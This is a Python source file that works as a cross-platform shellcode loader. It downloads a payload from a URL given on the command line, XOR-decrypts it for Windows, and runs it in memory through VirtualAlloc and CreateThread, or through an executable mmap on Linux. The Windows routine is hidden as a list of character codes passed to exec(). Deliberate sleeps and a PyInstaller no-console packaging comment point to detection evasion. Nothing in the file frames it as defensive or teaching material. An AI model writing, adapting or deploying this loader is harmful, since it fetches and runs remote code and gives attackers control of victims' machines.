import sys
import mmap
import ctypes
import time
import argparse
import urllib.request


def downloader(shellcode_url):
    try:
        with urllib.request.urlopen(shellcode_url) as f:
            time.sleep(3)
            data = f.read()
            shellcode = bytearray(data)
            return shellcode
    except:
        return bytearray()


def exec_lin(shellcode):
    mm = mmap.mmap(
        -1,
        mmap.PAGESIZE,
        mmap.MAP_SHARED,
        mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
    )
    time.sleep(1)
    mm.write(shellcode)

    ptr = int.from_bytes(ctypes.string_at(id(mm) + 16, 8), "little")

    functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
    fn = functype(ptr)
    time.sleep(2)
    fn()


def exec_win(shellcode):
    shellcode = shellcode
    s = [107, 101, 114, 110, 101, 108, 51, 50, 32, 61, 32, 99, 116, 121, 112, 101, 115, 46, 119, 105, 110, 100, 108, 108, 46, 107, 101, 114, 110, 101, 108, 51, 50, 10, 108, 101, 110, 103, 116, 104, 32, 61, 32, 108, 101, 110, 40, 115, 104, 101, 108, 108, 99, 111, 100, 101, 41, 10, 10, 116, 105, 109, 101, 46, 115, 108, 101, 101, 112, 40, 49, 41, 10, 10, 107, 101, 114, 110, 101, 108, 51, 50, 46, 86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99, 46, 114, 101, 115, 116, 121, 112, 101, 32, 61, 32, 99, 116, 121, 112, 101, 115, 46, 99, 95, 118, 111, 105, 100, 95, 112, 10, 112, 116, 114, 32, 61, 32, 107, 101, 114, 110, 101, 108, 51, 50, 46, 86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99, 40, 78, 111, 110, 101, 44, 32, 108, 101, 110, 103, 116, 104, 44, 32, 48, 120, 51, 48, 48, 48, 44, 32, 48, 120, 52, 48, 41, 10, 10, 98, 117, 102, 32, 61, 32, 40, 99, 116, 121, 112, 101, 115, 46, 99, 95, 99, 104, 97, 114, 32, 42, 32, 108, 101, 110, 40, 115, 104, 101, 108, 108, 99, 111, 100, 101, 41, 41, 46, 102, 114, 111, 109, 95, 98, 117, 102, 102, 101, 114, 95, 99, 111, 112, 121, 40, 115, 104, 101, 108, 108, 99, 111, 100, 101, 41, 10, 10, 107, 101, 114, 110, 101, 108, 51, 50, 46, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 46, 97, 114, 103, 116, 121, 112, 101, 115, 32, 61, 32, 40, 99, 116, 121, 112, 101, 115, 46, 99, 95, 118, 111, 105, 100, 95, 112, 44, 32, 99, 116, 121, 112, 101, 115, 46, 99, 95, 118, 111, 105, 100, 95, 112, 44, 32, 99, 116, 121, 112, 101, 115, 46, 99, 95, 115, 105, 122, 101, 95, 116, 41, 10, 107, 101, 114, 110, 101, 108, 51, 50, 46, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 40, 112, 116, 114, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 103, 116, 104, 41, 10, 10, 116, 105, 109, 101, 46, 115, 108, 101, 101, 112, 40, 50, 41, 10, 10, 104, 116, 32, 61, 32, 99, 116, 121, 112, 101, 115, 46, 119, 105, 110, 100, 108, 108, 46, 107, 101, 114, 110, 101, 108, 51, 50, 46, 67, 114, 101, 97, 116, 101, 84, 104, 114, 101, 97, 100, 40, 10, 32, 32, 32, 32, 99, 116, 121, 112, 101, 115, 46, 99, 95, 105, 110, 116, 40, 48, 41, 44, 32, 99, 116, 121, 112, 101, 115, 46, 99, 95, 105, 110, 116, 40, 48, 41, 44, 32, 99, 116, 121, 112, 101, 115, 46, 99, 95, 118, 111, 105, 100, 95, 112, 40, 112, 116, 114, 41, 44, 32, 99, 116, 121, 112, 101, 115, 46, 99, 95, 105, 110, 116, 40, 48, 41, 44, 10, 32, 32, 32, 32, 99, 116, 121, 112, 101, 115, 46, 99, 95, 105, 110, 116, 40, 48, 41, 44, 32, 99, 116, 121, 112, 101, 115, 46, 112, 111, 105, 110, 116, 101, 114, 40, 99, 116, 121, 112, 101, 115, 46, 99, 95, 105, 110, 116, 40, 48, 41, 41, 10, 41, 10, 10, 99, 111, 100, 101, 32, 61, 32, 99, 116, 121, 112, 101, 115, 46, 119, 105, 110, 100, 108, 108, 46, 107, 101, 114, 110, 101, 108, 51, 50, 46, 87, 97, 105, 116, 70, 111, 114, 83, 105, 110, 103, 108, 101, 79, 98, 106, 101, 99, 116, 40, 99, 116, 121, 112, 101, 115, 46, 99, 95, 105, 110, 116, 40, 104, 116, 41, 44, 32, 99, 116, 121, 112, 101, 115, 46, 99, 95, 105, 110, 116, 40, 45, 49, 41, 41, 10, 112, 114, 105, 110, 116, 40, 39, 91, 43, 93, 32, 76, 97, 115, 116, 32, 101, 114, 114, 111, 114, 39, 44, 32, 99, 116, 121, 112, 101, 115, 46, 71, 101, 116, 76, 97, 115, 116, 69, 114, 114, 111, 114, 40, 41, 44, 32, 99, 116, 121, 112, 101, 115, 46, 70, 111, 114, 109, 97, 116, 69, 114, 114, 111, 114, 40, 99, 116, 121, 112, 101, 115, 46, 71, 101, 116, 76, 97, 115, 116, 69, 114, 114, 111, 114, 40, 41, 41, 41, 10]
    exec(''.join([chr(i) for i in s]))


# Example of usage:
# pyinstaller-x86.exe pe.py --onefile -i NONE --clean --noconsole
# pe.exe -u http://{ip.ip.ip.ip}/result.bin
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', type=str, metavar='', required=True, help="URL to raw file")
        parser.add_argument('-a', '--os', metavar='', required=False, help="Choose OS: win/nix", choices=['win', 'nix'], default='win')
        args = parser.parse_args()

        if args.os == 'win':
            shellcode = downloader(args.url)
            key = shellcode[:8]
            shellcode = shellcode[8:]
            cipher = key * (len(shellcode) // len(key)) + key[:len(shellcode) % len(key)]
            shellcode = bytes(p ^ k for p, k in zip(shellcode, cipher))

            exec_win(shellcode)
        elif args.os == 'nix':
            shellcode = downloader(args.url)
            exec_lin(shellcode)
    except Exception: pass
